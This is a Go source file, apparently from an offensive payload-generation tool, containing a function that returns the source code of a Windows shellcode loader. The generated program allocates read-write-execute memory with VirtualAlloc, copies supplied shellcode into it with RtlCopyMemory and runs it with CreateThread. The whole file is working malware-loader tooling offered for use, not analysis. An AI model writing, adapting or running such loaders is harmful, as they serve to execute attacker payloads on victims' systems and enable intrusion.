package loaders

import (
	"fmt"
)

func GetCreateThreadTemplate(targetProcess string) string {
	var _ = targetProcess // unused in this template

	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread    = kernel32.MustFindProc("CreateThread")
)

func ExecuteOrderSixtySix(shellcode []byte) {

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	_, _, _ = CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	select {}
}
    `)
}
